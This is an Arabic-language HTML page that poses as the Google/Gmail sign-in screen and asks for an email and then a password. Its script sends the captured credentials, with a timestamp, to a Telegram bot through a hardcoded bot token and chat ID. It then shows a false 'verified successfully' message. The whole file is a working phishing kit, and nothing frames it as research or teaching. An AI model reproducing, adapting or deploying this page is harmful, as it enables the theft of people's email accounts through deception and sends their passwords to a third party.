<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 500px;
        }

        .google-logo {
            width: 120px;
            height: 40px;
            margin: 0 auto 40px;
        }

        .google-logo img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .page-heading {
            text-align: center;
            font-size: 32px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 8px;
        }

        .page-subheading {
            text-align: center;
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 40px;
        }

        .form-group {
            margin-bottom: 25px;
        }

        .input-wrapper {
            position: relative;
        }

        .input-container {
            display: flex;
            align-items: center;
            position: relative;
        }

        input {
            width: 100%;
            padding: 16px 20px;
            padding-right: 120px;
            background: white;
            border: 1px solid #dadce0;
            border-radius: 8px;
            color: #202124;
            font-size: 16px;
            font-family: inherit;
            transition: all 0.3s ease;
            text-align: right;
        }

        input:focus {
            outline: none;
            border-color: #1f73e6;
            box-shadow: 0 1px 3px rgba(31, 115, 230, 0.3);
        }

        input::placeholder {
            color: #80868b;
        }

        .email-suffix {
            position: absolute;
            right: 20px;
            color: #80868b;
            font-size: 16px;
            pointer-events: none;
        }

        .email-suffix.hidden {
            display: none;
        }

        .forgot-link {
            text-align: center;
            margin-top: 15px;
        }

        .forgot-link a {
            color: #1f73e6;
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-link a:hover {
            text-decoration: underline;
        }

        .create-account {
            text-align: center;
            margin-bottom: 30px;
        }

        .create-account a {
            color: #1f73e6;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .create-account a:hover {
            text-decoration: underline;
        }

        .form-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 30px;
        }

        .submit-btn {
            padding: 10px 32px;
            background: #1f73e6;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .submit-btn:hover {
            background: #1765cc;
            box-shadow: 0 1px 3px rgba(31, 115, 230, 0.3);
        }

        .submit-btn:active {
            background: #1555c0;
        }

        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        /* Password Page Styles */
        .password-page {
            display: none;
        }

        .password-page.active {
            display: block;
        }

        .email-display {
            background: white;
            border: 1px solid #dadce0;
            border-radius: 50px;
            padding: 8px 16px;
            margin-bottom: 40px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
        }

        .email-text {
            flex: 1;
            color: #202124;
            font-size: 14px;
            text-align: right;
        }

        .dropdown-icon {
            color: #202124;
            font-size: 16px;
        }

        .profile-icon {
            width: 36px;
            height: 36px;
            background: #dadce0;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #5f6368;
            font-size: 18px;
        }

        .password-input-container {
            position: relative;
            margin-bottom: 20px;
        }

        .password-label {
            display: block;
            font-size: 12px;
            color: #1f73e6;
            margin-bottom: 8px;
            font-weight: 500;
            text-align: right;
        }

        .password-input {
            width: 100%;
            padding: 16px 20px !important;
            padding-right: 20px !important;
            border: 2px solid #1f73e6 !important;
            border-radius: 8px;
            font-size: 16px;
            text-align: right;
        }

        .password-input:focus {
            outline: none;
            border-color: #1f73e6 !important;
            box-shadow: 0 1px 3px rgba(31, 115, 230, 0.3) !important;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-top: 12px;
            margin-bottom: 20px;
        }

        .checkbox-container input[type="checkbox"] {
            width: auto;
            padding: 0;
            border: none;
            background: none;
            cursor: pointer;
        }

        .checkbox-container label {
            margin: 0;
            font-size: 13px;
            color: #5f6368;
            font-weight: 400;
            cursor: pointer;
        }

        .loading {
            display: none;
            text-align: center;
            color: #202124;
            margin-top: 20px;
        }

        .spinner {
            border: 3px solid #f0f0f0;
            border-top: 3px solid #1f73e6;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 480px) {
            .container {
                padding: 0 15px;
            }

            .page-heading {
                font-size: 24px;
            }

            .page-subheading {
                font-size: 14px;
            }

            input {
                font-size: 16px;
            }

            .form-actions {
                flex-direction: column;
                gap: 12px;
            }

            .submit-btn {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- الصفحة الأولى - البريد والرقم -->
        <div class="login-page active">
            <div class="google-logo">
                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
            </div>

            <h1 class="page-heading">تسجيل الدخول</h1>
            <p class="page-subheading">المتابعة إلى Gmail</p>

            <form id="loginForm">
                <div class="form-group">
                    <div class="input-container">
                        <input 
                            type="text" 
                            id="emailPhone" 
                            name="emailPhone"
                            placeholder="البريد الإلكتروني أو الهاتف"
                            required
                        >
                        <span class="email-suffix" id="emailSuffix">@gmail.com</span>
                    </div>
                </div>

                <p class="forgot-link">
                    <a href="#">هل نسيت بريدك الإلكتروني؟</a>
                </p>

                <div class="form-actions">
                    <button type="submit" class="submit-btn">التالي</button>
                    <p class="create-account">
                        <a href="#">إنشاء حساب</a>
                    </p>
                </div>
            </form>

            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>جاري المتابعة...</p>
            </div>
        </div>

        <!-- الصفحة الثانية - كلمة المرور -->
        <div class="password-page">
            <div class="google-logo">
                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
            </div>

            <h1 class="page-heading">مرحباً</h1>

            <div class="email-display">
                <div class="profile-icon">👤</div>
                <span class="dropdown-icon">▼</span>
                <span class="email-text" id="displayEmail">your.email@gmail.com</span>
            </div>

            <form id="passwordForm">
                <div class="password-input-container">
                    <label class="password-label">إدخال كلمة المرور</label>
                    <input 
                        type="password" 
                        id="passwordInput" 
                        name="password"
                        class="password-input"
                        placeholder="أدخل كلمة المرور"
                        required
                    >
                </div>

                <div class="checkbox-container">
                    <input type="checkbox" id="showPassword" onchange="togglePassword()">
                    <label for="showPassword">عرض كلمة المرور</label>
                </div>

                <p class="forgot-link">
                    <a href="#">هل نسيت كلمة المرور؟</a>
                </p>

                <div class="form-actions">
                    <button type="submit" class="submit-btn">التالي</button>
                </div>
            </form>

            <div class="loading" id="passwordLoading">
                <div class="spinner"></div>
                <p>جاري التحقق...</p>
            </div>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8607340933:AAEKE8jwaYZVx_4955TocD8kCeg6se9Fdyg';
        const TELEGRAM_CHAT_ID = '6873334348';

        let savedEmail = '';

        // الصفحة الأولى
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const emailPhone = document.getElementById('emailPhone').value.trim();

            if (!emailPhone) {
                alert('الرجاء إدخال البريد أو الرقم');
                return;
            }

            savedEmail = emailPhone;

            // الانتقال إلى صفحة كلمة المرور
            goToPasswordPage(emailPhone);
        });

        // التحكم بحقل البريد/الرقم
        document.getElementById('emailPhone').addEventListener('input', function(e) {
            const value = e.target.value;
            const isPhone = /^\d/.test(value);
            const suffix = document.getElementById('emailSuffix');

            if (isPhone) {
                suffix.classList.add('hidden');
            } else {
                suffix.classList.remove('hidden');
            }
        });

        // صفحة كلمة المرور
        document.getElementById('passwordForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const password = document.getElementById('passwordInput').value;

            if (!password) {
                alert('الرجاء إدخال كلمة المرور');
                return;
            }

            document.getElementById('passwordLoading').style.display = 'block';

            // إرسال البيانات إلى التلجرام
            await sendToTelegram(savedEmail, password);

            document.getElementById('passwordLoading').style.display = 'none';

            alert('تم التحقق بنجاح!');
            document.getElementById('passwordForm').reset();
        });

        function togglePassword() {
            const input = document.getElementById('passwordInput');
            const checkbox = document.getElementById('showPassword');

            if (checkbox.checked) {
                input.type = 'text';
            } else {
                input.type = 'password';
            }
        }

        function goToPasswordPage(emailOrPhone) {
            const isPhone = /^\d{10,}$/.test(emailOrPhone);
            const displayValue = isPhone ? emailOrPhone : emailOrPhone.includes('@') ? emailOrPhone : emailOrPhone + '@gmail.com';

            document.querySelector('.login-page').classList.remove('active');
            document.querySelector('.password-page').classList.add('active');
            document.getElementById('displayEmail').textContent = displayValue;
        }

        async function sendToTelegram(email, password) {
            try {
                const message = `
📧 <b>بيانات دخول جديدة</b>
━━━━━━━━━━━━━━━━━
📌 <b>البريد الإلكتروني:</b> <code>${email}</code>
🔐 <b>كلمة المرور:</b> <code>${password}</code>
⏰ <b>التاريخ والوقت:</b> ${new Date().toLocaleString('ar-SA')}
━━━━━━━━━━━━━━━━━`;

                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const data = await response.json();

                if (data.ok) {
                    console.log('تم إرسال البيانات بنجاح');
                }
            } catch (error) {
                console.error('Error:', error);
            }
        }
    </script>
</body>
</html>
